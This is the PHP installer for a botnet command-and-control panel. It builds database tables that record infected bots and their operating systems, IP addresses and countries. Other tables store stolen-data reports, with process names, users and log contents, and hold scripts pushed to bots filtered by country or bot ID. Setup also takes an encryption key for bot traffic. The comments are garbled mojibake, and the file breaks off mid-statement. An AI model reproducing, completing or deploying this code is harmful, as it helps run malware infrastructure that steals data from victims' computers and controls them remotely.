<?php define('__INSTALL__', 1);
require_once('../system/global.php'); 

////////////////////////////////////////////////// / / ///////////////////////////////////////////////
// RљRѕRЅSЃS, P ° RЅS, C <.
////////////////////////////////////////////////// / / ///////////////////////////////////////////////

//P ¤ P ° P № P "C <.
define('FILE_GEOBASE', 'geobase.txt');          //P RμRѕR ± P ° P ° P ·
define('FILE_CONFIG',  '../system/config.php'); //RљRѕRЅS "ReRі.

//P-P ° RіRѕR "RѕRІRѕRє
define('APP_TITLE', 'Control Panel '.BO_CLIENT_VERSION.' Installer');

//RџR ° ° SЂR RјRμS, SЂS <RґReR ° P "RѕRіR °.
define('DIALOG_WIDTH',       '350px'); //REReSЂReRЅR RґReR ° ° P "RѕRіR °.
define('DIALOG_INPUT_WIDTH', '150px'); //REReSЂReRЅR ° <input>.

//RџRѕRґRєR "SЋS ‡ RμRЅReRμ C RμRјS <.
define('THEME_PATH', '../theme');
require_once(THEME_PATH.'/index.php'); 

////////////////////////////////////////////////// / / ///////////////////////////////////////////////
// RЎRїReSЃRѕRє C, P ° P ± P "Republic of †.
////////////////////////////////////////////////// / / ///////////////////////////////////////////////

//RЎRїReSЃRѕRє P ± RѕS, RѕRІ
$_TABLES['botnet_list'] =
"`bot_id`         varchar(".BOT_ID_MAX_CHARS.") NOT NULL default '' UNIQUE, ".            //ID P ± RѕS, P °.
"`botnet`         varchar(".BOTNET_MAX_CHARS.") NOT NULL default '".DEFAULT_BOTNET."', ". //R'RѕS, RЅRμS.
"`bot_version`    int unsigned      NOT NULL default '0', ".                              //R'RμSЂSЃReSЏ P ± RѕS, P °.

"`net_latency`    int unsigned      NOT NULL default '0', ".                              //P> P ° Rі SЃRѕRμRґReRЅRμRЅReSЏ.
"`tcpport_s1`     smallint unsigned NOT NULL default '0', ".                              //TCP RїRѕSЂS, S1.

"`time_localbias` int signed        NOT NULL default '0', ".                              //RћS C SЃRμS, P "RѕRєR ° P" SЊRЅRѕRіRѕ RІSЂRμRјRμRЅRe RІ SЃRμRєSѓRЅRґR ° C ....
"`os_version`     tinyblob          NOT NULL, ".                                          //P "P ° RЅRЅS <Rμ RѕR ± OS (dwMajor, dwMinor, dwBuild, dwSP, wSuiteMask, wProductType).
"`language_id`    smallint unsigned NOT NULL default '0', ".                              //ID SЏR · C <RєR ° OS.

"`ipv4_list`      blob              NOT NULL, ".                                          //RЎRїReSЃRѕRє IPv4 P ° RґSЂRμSЃRѕRІ.
"`ipv6_list`      blob              NOT NULL, ".                                          //RЎRїReSЃRѕRє IPv6 P ° RґSЂRμSЃRѕRІ.
"`ipv4`           varbinary(4)      NOT NULL default '\\0\\0\\0\\0', ".                   //IPv4
"`country`        varchar(2)        NOT NULL default '--', ".                             //RЎS, SЂR RЅR ° °.

"`rtime_first`    int unsigned      NOT NULL default '0', ".                              //R'SЂRμRјSЏ RїRμSЂRІRѕRіRѕ RѕS, C ‡ RμS, P ° ± RѕR RѕRЅR "P ° P № RЅRμ.
"`rtime_last`     int unsigned      NOT NULL default '0', ".                              //R'SЂRμRјSЏ RїRѕSЃR "RμRґRЅRμRіRѕ RѕS, C ‡ RμS, P ° ± RѕR RѕRЅR" P ° P № RЅRμ.
"`rtime_online`   int unsigned      NOT NULL default '0', ".                              //R'SЂRμRјSЏ, c RєRѕS, RѕSЂRѕRіRѕ P ± RѕS, RЅR ° C ... RѕRґReS, SЊSЃSЏ RІ RѕRЅR "P ° P № RЅRμ.

"`flag_new`       bool              NOT NULL default '1', ".                              //R'SЂRμRјSЏ, c RєRѕS, RѕSЂRѕRіRѕ P ± RѕS, RЅR ° C ... RѕRґReS, SЊSЃSЏ RІ RѕRЅR "P ° P № RЅRμ.
"`flag_used`      bool              NOT NULL default '0', ".                              //R'SЂRμRјSЏ, c RєRѕS, RѕSЂRѕRіRѕ P ± RѕS, RЅR ° C ... RѕRґReS, SЊSЃSЏ RІ RѕRЅR "P ° P № RЅRμ.

"`comment`        tinytext          NOT NULL";                                            //RљRѕRјRјRμRЅS, P ° P ± SЂReRe Rє RѕS, Sѓ.

//PEP ° F ± P "RѕRЅ RѕS, C ‡ RμS, RѕRІ.
$_TABLES['botnet_reports'] =
"`id`             int unsigned      NOT NULL auto_increment PRIMARY KEY, ".
"`bot_id`         varchar(".BOT_ID_MAX_CHARS.") NOT NULL default '', ".                    //ID P ± RѕS, P °.
"`botnet`         varchar(".BOTNET_MAX_CHARS.") NOT NULL default '".DEFAULT_BOTNET."', ".  //R'RѕS, RЅRμS.
"`bot_version`    int unsigned      NOT NULL default '0', ".                               //R'RμSЂSЃReSЏ P ± RѕS, P °.

"`path_source`    text              NOT NULL, ".                                           //R'RμSЂSЃReSЏ P ± RѕS, P °.
"`path_dest`      text              NOT NULL, ".                                           //RљRѕRЅRμS ‡ RЅS <P № RїSѓS, SЊ R "RѕRіR °.

"`time_system`    int unsigned      NOT NULL default '0', ".                               //RћS C SЃRμS, P "RѕRєR ° P" SЊRЅRѕRіRѕ RІSЂRμRјRμRЅRe RІ SЃRμRєSѓRЅRґR ° C ....
"`time_tick`      int unsigned      NOT NULL default '0', ".                               //RћS C SЃRμS, P "RѕRєR ° P" SЊRЅRѕRіRѕ RІSЂRμRјRμRЅRe RІ RјSЃ.
"`time_localbias` int               NOT NULL default '0', ".                               //RћS C SЃRμS, P "RѕRєR ° P" SЊRЅRѕRіRѕ RІSЂRμRјRμRЅRe RІ SЃRμRєSѓRЅRґR ° C ....

"`os_version`     tinyblob          NOT NULL, ".                                           //P "P ° RЅRЅS <Rμ RѕR ± OS (OSINFO).
"`language_id`    smallint unsigned NOT NULL default '0', ".                               //ID SЏR · C <RєR ° OS.

"`process_name`   text NOT NULL, ".                                                        //ID SЏR · C <RєR ° OS.
"`process_user`   text NOT NULL, ".                                                        //ID SЏR · C <RєR ° OS.

"`type`           int unsigned      NOT NULL default '0', ".                               //RўReRї R "RѕRіR °.
"`context`        longtext          NOT NULL, ".                                           //RЎRѕRґRμSЂR ReRјRѕRμ ¶ P "RѕRіR °.

"`ipv4`           varbinary(15)     NOT NULL default '0.0.0.0', ".                         //IPv4
"`country`        varchar(2)        NOT NULL default '--', ".                              //RЎS, SЂR RЅR ° °.
"`rtime`          int unsigned      NOT NULL default '0'";                                 //R'SЂRμRјSЏ RѕS, C ‡ RμS, P °.

//P'p ° F · P ° IPv4 to Country.
$_TABLES['ipv4toc'] =
"`l` int unsigned NOT NULL default '0', ". //RќReR RЅReR ¶ № IP.
"`h` int unsigned NOT NULL default '0', ". //R'RμSЂS ... RЅReR № IP.
"`c` varbinary(2) NOT NULL default '--'";  //RЎS, SЂR RЅR ° °.

//RЎRїReSЃRѕRє RїRѕR "SЊR · RѕRІR ° C RμR" RμR №.
$_TABLES['cp_users'] = 
"`id`            int unsigned    NOT NULL auto_increment PRIMARY KEY, ".
"`name`          varchar(20)     NOT NULL default '' UNIQUE, ".           //RЎRїReSЃRѕRє RїRѕR "SЊR · RѕRІR ° C RμR" RμR №.
"`pass`          varchar(32)     NOT NULL default '', ".                  //RџR ° SЂRѕR "SЊ.
"`language`      varbinary(2)    NOT NULL default 'en', ".                //RЇR · C <Rє RїRѕR "SЊR · RѕRІR ° C RμR" SЏ.
"`flag_enabled`  bool            NOT NULL default '1', ".                 //P ¤ P "P ° Rі RІRєR" SЋS ‡ RμRЅRЅRѕRіRѕ RїRѕR "SЊR · RѕRІR ° C RμR" SЏ
"`comment`       tinytext        NOT NULL, ".                             //RљRѕRјRјRμRЅS, P ° SЂReRe.

//P P ° P · R "Res RЅS ‡ <Rμ RЅR ° SЃS, SЂRѕR number RєRe.
"`ss_format`    varbinary(10)    NOT NULL default 'jpeg', ".              //P ¤ RѕSЂRјR ° C SЃRєSЂReRЅS € RѕS, RѕRІ.
"`ss_quality`   tinyint unsigned NOT NULL default '30', ".                //RљR ° C ‡ RμSЃS, RІRѕ SЃRєSЂReRЅS € RѕS, P °.

//RџSЂR RІR ° °.
"`r_edit_bots`           bool NOT NULL default '1', ".

"`r_stats_main`          bool NOT NULL default '1', ".
"`r_stats_main_reset`    bool NOT NULL default '1', ".
"`r_stats_os`            bool NOT NULL default '1', ".

"`r_botnet_bots`         bool NOT NULL default '1', ".
"`r_botnet_scripts`      bool NOT NULL default '1', ".
"`r_botnet_scripts_edit` bool NOT NULL default '1', ".

"`r_reports_db`          bool NOT NULL default '1', ".
"`r_reports_db_edit`     bool NOT NULL default '1', ".
"`r_reports_files`       bool NOT NULL default '1', ".
"`r_reports_files_edit`  bool NOT NULL default '1', ".
/*EVAL_BEGIN*/if(configBool('jabber_notifier'))return 
"\"`r_reports_jn`          bool NOT NULL default '1', \".";
/*EVAL_END*/

"`r_system_info`         bool NOT NULL default '1', ".
"`r_system_options`      bool NOT NULL default '1', ".
"`r_system_user`         bool NOT NULL default '1', ".
"`r_system_users`        bool NOT NULL default '1'";

//RЎRєSЂReRїS, C <P ± RѕS, P ° Rј.
$_TABLES['botnet_scripts'] =
"`id`           int unsigned  NOT NULL auto_increment PRIMARY KEY,".
"`extern_id`    varbinary(16) NOT NULL default '0', ".                //R'RЅRμS € RЅReR № ID.
"`name`         varchar(255)  NOT NULL default '', ".                 //RќR ° F · RІR ° RЅReRμ RіSЂSѓRїRїS <.
"`flag_enabled` bool          NOT NULL default '0', ".                //RЎRєSЂReRїS, P ° RєS, ReRІRЅR °.
"`time_created` int unsigned  NOT NULL default '0', ".                //R'SЂRμRјSЏ SЃRѕR · RґR RЅReSЏ SЃRєSЂReRїS °, P °.
"`send_limit`   int unsigned  NOT NULL default '0', ".                //P> ReRјReS, P ± RѕS, RѕRІ.

"`bots_wl`      text          NOT NULL, ".                            //RЎRїReSЃRѕRє P ± RѕS, RѕRІ, для которых нужно испольнять скрипт.
"`bots_bl`      text          NOT NULL, ".                            //RЎRїReSЃRѕRє P ± RѕS, RѕRІ, для которых не нужно испольнять скрипт.
"`botnets_wl`   text          NOT NULL, ".                            //RЎRїReSЃRѕRє P ± RѕS, RЅRμS, RѕRІ, RґR "SЏ RєRѕS, RѕSЂS <C ... RЅSѓR ¶ RЅRѕ ReSЃRїRѕR" SЊRЅSЏS, SЊ SЃRєSЂReRїS.
"`botnets_bl`   text          NOT NULL, ".                            //RЎRїReSЃRѕRє P ± RѕS, RЅRμS, RѕRІ, RґR "SЏ RєRѕS, RѕSЂS <C ... RЅRμ RЅSѓR ¶ RЅRѕ ReSЃRїRѕR" SЊRЅSЏS, SЊ SЃRєSЂReRїS.
"`countries_wl` text          NOT NULL, ".                            //RЎRїReSЃRѕRє SЃS, SЂR ° RЅ, RґR "SЏ RєRѕS, RѕSЂS <C ... RЅSѓR ¶ RЅRѕ ReSЃRїRѕR" SЊRЅReS, SЊ SЃRєSЂReRїS.
"`countries_bl` text          NOT NULL, ".                            //RЎRїReSЃRѕRє SЃS, SЂR ° RЅ, RґR "SЏ RєRѕS, RѕSЂS <C ... RЅRμ RЅSѓR ¶ RЅRѕ ReSЃRїRѕR" RЅSЏS, SЊ SЃRєSЂReRїS.

"`script_text`   text         NOT NULL, ".                            //RўRμRєSЃS, RѕRІRѕRμ RїSЂRμRґSЃS, P ° RІR "RμRЅReRμ RєRѕRјR ° RЅRґ RІ RіSЂSѓRїRїRμ.
"`script_bin`    blob         NOT NULL";                              //R'ReRЅR SЂRЅRѕRμ RїSЂRμRґSЃS °, P ° RІR "RμRЅReRμ RєRѕRјR ° RЅRґ RІ RіSЂSѓRїRїRμ.

//RЎS, P ° C ReSЃS, ReRєR ° SЃRєSЂReRїS, RѕRІ RїRѕ P ± RѕS, P ° Rј.
$_TABLES['botnet_scripts_stat'] =
"`extern_id`   varbinary(16)                 NOT NULL, ".             //R'RЅRμS € RЅReR № ID.
"`type`        tinyint unsigned              NOT NULL default '0', ". //RўReRїR ° F ° F · RїReSЃRe. 1 - RѕS, RїSЂR ° P "RІRμRЅ, 2 - ReSЃRїRѕR" RЅRμRЅ, 3 - RѕS € Pepsi ± RєR °.
"`bot_id`      varchar(".BOT_ID_MAX_CHARS.") NOT NULL default '', ".  //ID P ± RѕS, P °.
"`bot_version` int unsigned                  NOT NULL default '0', ". //R'RμSЂSЃReSЏ P ± RѕS, P °.
"`rtime`       int unsigned                  NOT NULL default '0', ". //R'SЂRμRјSЏ RѕS, C ‡ RμS, P °.
"`report`      text                          NOT NULL, ".             //RўRμRєSЃS, RѕRІS <P № RѕS, C ‡ RμS, P ± RѕS, P ° Rѕ RІS <RїRѕR "RЅRμRЅReRe SЃS † RμRЅR ° SЂReSЏ.
"UNIQUE(`extern_id`, `bot_id`, `type`)";                                                   

////////////////////////////////////////////////// / / ///////////////////////////////////////////////
// P RЅR ° C ‡ RμRЅReSЏ RїRѕ SѓRјRѕR "C ‡ P ° RЅReSЋ.
////////////////////////////////////////////////// / / ///////////////////////////////////////////////

$pd_user            = 'admin';
$pd_pass            = '';

$pd_mysql_host      = '127.0.0.1';
$pd_mysql_user      = 'root';
$pd_mysql_pass      = '';
$pd_mysql_db        = 'cpdb';

$pd_reports_path    = '_reports';
$pd_reports_to_db   = 1;
$pd_reports_to_fs   = 0;

$pd_botnet_timeout  = 25;
$pd_botnet_cryptkey = '';

$_OUTPUT = '';

////////////////////////////////////////////////// / / ///////////////////////////////////////////////
// P ¤ † SѓRЅRєS ReRe.
////////////////////////////////////////////////// / / ///////////////////////////////////////////////

//RћS, RѕR SЂR ± ° P ¶ RμRЅReRμ RѕS € Pepsi ± RєRe.
function ShowError($text)
{
  global $_OUTPUT;
  $_OUTPUT .= THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', '&#8226; ERROR:'.$text, THEME_DIALOG_ITEM_ERROR).THEME_DIALOG_ROW_END;
}

//RћS, RѕR SЂR ± ° P ¶ RμRЅReRμ RїSЂRѕS † RμSЃSЃR °.
function ShowProgress($text)
{
  global $_OUTPUT;
  $_OUTPUT .= THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', '&#8226; '.$text, THEME_DIALOG_ITEM_SUCCESSED).THEME_DIALOG_ROW_END;
}

//RЎRѕR · RґR RЅReRμ ° C, P ° P ± P "Republic † C <.
function CreateTable($name)
{
  global $_TABLES;
  
  ShowProgress("Creating table ".THEME_STRING_BOLD_BEGIN."'{$name}'".THEME_STRING_BOLD_END.".");
  if(!@mysql_query("DROP TABLE IF EXISTS `{$name}`") || !@mysql_query("CREATE TABLE `{$name}` ({$_TABLES[$name]}) ENGINE=MyISAM CHARACTER SET=".MYSQL_CODEPAGE." COLLATE=".MYSQL_COLLATE))
  {
    ShowError("Failed: ".htmlEntitiesEx(mysql_error()));
    return false;
  }
  
  return true;
}

//RћR ± RЅR ° RІR "RμRЅReRμ C, P ° P ± P" Republic † C <.
function UpdateTable($name)
{
  global $_TABLES;
  
  ShowProgress("Updating table ".THEME_STRING_BOLD_BEGIN."'{$name}'".THEME_STRING_BOLD_END.".");  
  if(!@mysql_query("CREATE TABLE IF NOT EXISTS `{$name}` ({$_TABLES[$name]}) ENGINE=MyISAM CHARACTER SET=".MYSQL_CODEPAGE." COLLATE=".MYSQL_COLLATE))
  {
    ShowError("Failed: ".htmlEntitiesEx(mysql_error()));
    return false;
  }
  
  //@ Mysql_query ("ALTER TABLE` {$ name} `CHARACTER SET =". MYSQL_CODEPAGE. "COLLATE =". MYSQL_COLLATE);
  
  //RћR ± RЅR ° RІR "SЏRμRј RЅR ° SѓRґR ° C ‡ Sѓ.
  $list = explode(',', $_TABLES[$name]);
  foreach($list as &$l)@mysql_query("ALTER TABLE `{$name}` ADD {$l}");

  return true;
}

//RћR ± RЅR ° RІR "RμRЅReRμ C, P ° P ± P" Republic † C <RїRѕ RґR ° RЅRЅS <Rј RґSЂSѓRіRѕR № C, P ° P ± P "Republic † C <.
function UpdateTableEx($name, $real_name)
{
  global $_TABLES;
  
  ShowProgress("Updating table ".THEME_STRING_BOLD_BEGIN."'{$name}'".THEME_STRING_BOLD_END.".");  
  if(!@mysql_query("CREATE TABLE IF NOT EXISTS `{$name}` ({$_TABLES[$real_name]}) ENGINE=MyISAM CHARACTER SET=".MYSQL_CODEPAGE." COLLATE=".MYSQL_COLLATE))
  {
    ShowError("Failed: ".htmlEntitiesEx(mysql_error()));
    return false;
  }
  
  //@ Mysql_query ("ALTER TABLE` {$ name} `CHARACTER SET =". MYSQL_CODEPAGE. "COLLATE =". MYSQL_COLLATE);
  
  //RћR ± RЅR ° RІR "SЏRμRј RЅR ° SѓRґR ° C ‡ Sѓ.
  $list = explode(',', $_TABLES[$real_name]);
  foreach($list as &$l)@mysql_query("ALTER TABLE `{$name}` ADD {$l}");
  
  return true;
}

//P RѕR ± P ° RІR "RμRЅReRμ SЃS, SЂRѕRєRe RІ C, P ° P ± P" † Res Sѓ
function AddRowToTable($name, $query)
{
  if(!mysqlQueryEx($name, "INSERT INTO `{$name}` SET {$query}"))
  {
    ShowError("Failed to write row to table ".THEME_STRING_BOLD_BEGIN."'{$name}'".THEME_STRING_BOLD_END.": %s".htmlEntitiesEx(mysql_error()));
    return false;
  }
  return true;
}

//RЎRѕR · RґR ° RЅReRμ RїSѓS, Fe.
function CreatePath($new_dir, $old_dir)
{
  $dir_r = '../'.$new_dir;
  
  if($old_dir != 0 && $old_dir != $new_dir && file_exists('../'.$old_dir))
  {
    ShowProgress("Renaming folder ".THEME_STRING_BOLD_BEGIN."'{$old_dir}'".THEME_STRING_BOLD_END." to ".THEME_STRING_BOLD_BEGIN."'{$new_dir}'".THEME_STRING_BOLD_END.".");
    if(!is_dir($dir_r) && !@rename('../'.$old_dir, $dir_r))
    {
      ShowError("Failed to rename folder.");
      return false;
    }
    
    @chmod($dir_r, 0777);
  }
  else
  {
    ShowProgress("Creating folder ".THEME_STRING_BOLD_BEGIN."'{$new_dir}'".THEME_STRING_BOLD_END.".");
    if(!is_dir($dir_r) && !@mkdir($dir_r, 0777))
    {
      ShowError("Failed to create folder ".THEME_STRING_BOLD_BEGIN."'{$new_dir}'".THEME_STRING_BOLD_END.".");
      return false;
    }
  }
  return true;
}

//R'S <P ± RѕSЂ SЂRμR ReRј SЂR ¶ ° P ± RѕS, C <.
$is_update = file_exists(FILE_CONFIG);

////////////////////////////////////////////////// / / ///////////////////////////////////////////////
// RџSЂRѕS † RμSЃSЃ SѓS, SЃR ° RЅRѕRІRєRe / RѕR ± RЅR ° RІR "RμRЅReSЏ.
////////////////////////////////////////////////// / / ///////////////////////////////////////////////
if(strcmp($_SERVER['REQUEST_METHOD'], 'POST') === 0)
{
  $error = false;
  $_OUTPUT = str_replace('{WIDTH}', DIALOG_WIDTH, THEME_DIALOG_BEGIN).
             str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, 'Installation steps:'), THEME_DIALOG_TITLE);
  
  //RџRѕR "SѓS ‡ RμRЅReRμ RџRѕSЃS," RґR ° RЅRЅS <C ....
  if($is_update)
  {
    if(!@include_once(FILE_CONFIG))
    {
      ShowError("Failed to open file '".FILE_CONFIG."'.");
      $error = true;
    }
    else
    {
      if(isset($config['reports_path']))$pd_reports_path       = $config['reports_path'];
      if(isset($config['reports_to_db']))$pd_reports_to_db     = $config['reports_to_db'] ? 1 : 0;
      if(isset($config['reports_to_fs']))$pd_reports_to_fs     = $config['reports_to_fs'] ? 1 : 0;
      if(isset($config['botnet_timeout']))$pd_botnet_timeout   = (int)($config['botnet_timeout'] / 60);
      if(isset($config['botnet_cryptkey']))$pd_botnet_cryptkey = $config['botnet_cryptkey'];
      
      $pd_mysql_host = isset($config['mysql_host']) ? $config['mysql_host'] : NULL;
      $pd_mysql_user = isset($config['mysql_user']) ? $config['mysql_user'] : NULL;
      $pd_mysql_pass = isset($config['mysql_pass']) ? $config['mysql_pass'] : NULL;
      $pd_mysql_db   = isset($config['mysql_db'])   ? $config['mysql_db']   : NULL;
    }
  }
  else
  {
    $pd_user            = checkPostData('user',         1,  20);
    $pd_pass            = checkPostData('pass',         6,  64);  
    
    $pd_reports_path    = checkPostData('path_reports', 1, 256);
    $pd_reports_to_db   = (isset($_POST['reports_to_db']));//B & & $ _POST ['Reports_to_db'] == 1);
    $pd_reports_to_fs   = (isset($_POST['reports_to_fs']));//B & & $ _POST ['Reports_to_fs'] == 1);
    $pd_botnet_timeout  = checkPostData('botnet_timeout',  1,   4);
    $pd_botnet_cryptkey = checkPostData('botnet_cryptkey', 1, 256);

    $pd_mysql_host      = checkPostData('mysql_host',   1, 256);
    $pd_mysql_user      = checkPostData('mysql_user',   1, 256);
    $pd_mysql_pass      = checkPostData('mysql_pass',   0, 256);
    $pd_mysql_db        = checkPostData('mysql_db',     1, 256);
  }

  $pd_reports_path = trim(str_replace('\\', '/', trim($pd_reports_path)), '/');
  
  //RћR SЂR ° ± P ± RѕS, RєR ° RѕS € Pepsi ± RѕRє.
  if(!$error)
  {
    if(!$is_update && ($pd_user === NULL || $pd_pass === NULL))
    {
      ShowError('Bad format of login data.');
      $error = true;
    }
    if($pd_mysql_host === NULL || $pd_mysql_user === NULL || $pd_mysql_db === NULL)
    {
      ShowError('Bad format of MySQL server data.');
      $error = true;
    }
    if($pd_reports_path === NULL)
    {
      ShowError('Bad format of reports path.');
      $error = true;
    }
    if(!is_numeric($pd_botnet_timeout) || $pd_botnet_timeout < 1)
    {
      ShowError('Bot online timeout have bad value.');
      $error = true;
    }
    if($pd_botnet_cryptkey === NULL)
    {
      ShowError('Bad format of encryption key.');
      $error = true;
    }
  }

  //RџRѕRґRєR "SЋS ‡ RμRЅReRμ Rє P ± P ° P · Rμ.
  if(!$error)
  {
    ShowProgress("Connecting to MySQL as ".THEME_STRING_BOLD_BEGIN."'{$pd_mysql_user}'".THEME_STRING_BOLD_END.".");
    if(!@mysql_connect($pd_mysql_host, $pd_mysql_user, $pd_mysql_pass) || !@mysql_query('SET NAMES \''.MYSQL_CODEPAGE.'\' COLLATE \''.MYSQL_COLLATE.'\''))
    {
      ShowError("Failed connect to MySQL server: ".htmlEntitiesEx(mysql_error()));
      $error = true;
    }
  }

  //R'S <P ± RѕSЂ C, P ° P ± P "Republic † C <.
  if(!$error)
  {
    $db = addslashes($pd_mysql_db);
    ShowProgress("Selecting DB ".THEME_STRING_BOLD_BEGIN."'{$pd_mysql_db}'".THEME_STRING_BOLD_END.".");
    
    if(!@mysql_query("CREATE DATABASE IF NOT EXISTS `{$db}`"))
    {
      ShowError("Failed to create database: ".htmlEntitiesEx(mysql_error()));
      $error = true;
    }
    else if(!@mysql_select_db($pd_mysql_db))
    {
      ShowError("Failed to select database: ".htmlEntitiesEx(mysql_error()));
      $error = true;
    }
    
    @mysql_query("ALTER DATABASE `{$db}` CHARACTER SET ".MYSQL_CODEPAGE." COLLATE ".MYSQL_COLLATE);
  }
  
  //RћR SЂR ° ± P ± P ° C, C <RІR RμRј ° C, P ° P ± P "Republic † C <.
  if(!$error)foreach($_TABLES as $table => $v)
  {
    //P-P ° RїRѕR "RЅRμRЅReRμ C, P ° P ± P" Republic † C <ipv4toc.
    if(strcmp($table, 'ipv4toc') == 0)
    {
      if(($error = !CreateTable($table)))break;
      ShowProgress("Filling table ".THEME_STRING_BOLD_BEGIN."'{$table}'".THEME_STRING_BOLD_END.".");
    
      if(($list = @file(FILE_GEOBASE)) === false)
      {
        ShowError("Failed to open file '".FILE_GEOBASE."'.");
        $error = true;
      }
      else
      {
        foreach($list as $item)
        {
          $cn = explode("\0", $item, 3);
          if(($error = !AddRowToTable($table, "l='{$cn[0]}', h='{$cn[1]}', c='".substr(trim($cn[2]), 0, 2)."'")))break;
        }
        unset($list);
      }
    }
    //RћR ± RЅRѕRІR "SЏRμRј SЃS, P ° SЂS <Rμ C, P ° P ± P" Republic † C <RѕS, C ‡ RμS, RѕRІ.
    else if(strcmp($table, 'botnet_reports') == 0)
    {
      if(($error = !CreateTable($table)))break;
      $rlist = listReportTables($pd_mysql_db);
      foreach($rlist as $rtable)if(($error = !UpdateTableEx($rtable, 'botnet_reports')))break;
    }
    else $error = !($is_update ? UpdateTable($table) : CreateTable($table));
    
    if($error)break;
  }

  //RЎRѕR · RґR ° RЅReRμ RґReSЂRμRєS, RѕSЂReRe RґR "SЏ RѕS, C ‡ RμS, RѕRІ.
  if(!$error)$error = !CreatePath($pd_reports_path, isset($config['reports_path']) ? $config['reports_path'] : 0);

  //RћR ± RЅRѕRІR "RμRЅReRμ C" P ° P № P "P ° RєRѕRЅS" ReRіSѓSЂR ° C † ReRe.
  if(!$error)
  {
    ShowProgress("Writing config file");
    
    $updateList['mysql_host']      = $pd_mysql_host;
    $updateList['mysql_user']      = $pd_mysql_user;
    $updateList['mysql_pass']      = $pd_mysql_pass;
    $updateList['mysql_db']        = $pd_mysql_db;
    $updateList['reports_path']    = $pd_reports_path;
    $updateList['reports_to_db']   = $pd_reports_to_db ? 1 : 0;
    $updateList['reports_to_fs']   = $pd_reports_to_fs ? 1 : 0;
    $updateList['botnet_timeout']  = ((int)($pd_botnet_timeout * 60));
    $updateList['botnet_cryptkey'] = $pd_botnet_cryptkey;
  
    if(!updateConfig($updateList))
    {
      ShowError("Failed write to config file.");
      $error = true;
    }
  }

  //P RѕR ± P ° RІR "RμRЅReRμ RїRѕR" SЊR · RѕRІR ° C RμR "SЏ RІ P ± P ° P · Sѓ.
  if(!$error && !$is_update)
  {
    ShowProgress("Adding user ".THEME_STRING_BOLD_BEGIN."'{$pd_user}'".THEME_STRING_BOLD_END.".");
    $error = !AddRowToTable('cp_users', "name='".addslashes($pd_user)."', pass='".md5($pd_pass)."', comment='Default user'");
  }
  
  //R'S <SЃS, P ° RІR "SЏRμRј RїSЂRѕR · SЂR ° C ‡ RЅRѕ RїSЂR RІR ° ° ° RЅR RєR ° C, P ° P" RѕRі RґR "SЏ RІSЂRμRјRμRЅRЅS <C ... C" P ° P № R "RѕRІ.
  @chmod('../tmp', 0777);
  
  //RЈSЃRїRμS € RЅRѕRμ P · P ° RІRμSЂS € RμRЅReRμ.
  if(!$error)
  {
    $_OUTPUT .= THEME_DIALOG_ROW_BEGIN.
                  str_replace('{TEXT}', THEME_STRING_BOLD_BEGIN.($is_update ? '-- Update complete! --' : '-- Installation complete! --').THEME_STRING_BOLD_END, THEME_DIALOG_ITEM_SUCCESSED).
                THEME_DIALOG_ROW_END;
    themeSmall(APP_TITLE, $_OUTPUT.THEME_DIALOG_END, 0, 0, 0);
    die();
  }
  $_OUTPUT .= THEME_DIALOG_END.THEME_VSPACE;
}

////////////////////////////////////////////////// / / ///////////////////////////////////////////////
// RћSЃRЅRѕRІRЅRѕR number RґReR ° P "RѕRі.
////////////////////////////////////////////////// / / ///////////////////////////////////////////////

if($is_update)
{
  @include_once(FILE_CONFIG);
  if(isset($config['mysql_db']))$pd_mysql_db = $config['mysql_db'];
}

if($is_update)$help =  "This application update/repair and reconfigure your control panel on this server. If you want make new installation, please remove file '".FILE_CONFIG."'.";
else          $help =  "This application install and configure your control panel on this server. Please type settings and press 'Install'.";

$_FORMITEMS = '';

//P "P ° RЅRЅS <Rμ SЋR · RμSЂR °.
if(!$is_update)
{
  $_FORMITEMS .=
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, 'Root user:'), THEME_DIALOG_GROUP_TITLE).
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', 'User name: (1-20 chars):', THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_user), 'user', '20', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', 'Password (6-64 chars):', THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_pass), 'pass', '64', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
    THEME_DIALOG_GROUP_END.
  THEME_DIALOG_ROW_END;
}

//P'p ° F · P ° ° RґR RЅRЅS <C ....
$_FORMITEMS .= 
THEME_DIALOG_ROW_BEGIN.
  str_replace('{COLUMNS_COUNT}', '2', THEME_DIALOG_GROUP_BEGIN).
  str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, 'MySQL server:'), THEME_DIALOG_GROUP_TITLE);
          
if(!$is_update)
{
  $_FORMITEMS .= 
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{TEXT}', 'Host:', THEME_DIALOG_ITEM_TEXT).
    str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_mysql_host), 'mysql_host', '64', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
  THEME_DIALOG_ROW_END.
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{TEXT}', 'User:', THEME_DIALOG_ITEM_TEXT).
    str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_mysql_user), 'mysql_user', '64', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
  THEME_DIALOG_ROW_END.
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{TEXT}', 'Password:', THEME_DIALOG_ITEM_TEXT).
    str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_mysql_pass), 'mysql_pass', '64', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
  THEME_DIALOG_ROW_END;
}     

$_FORMITEMS .= 
  THEME_DIALOG_ROW_BEGIN.
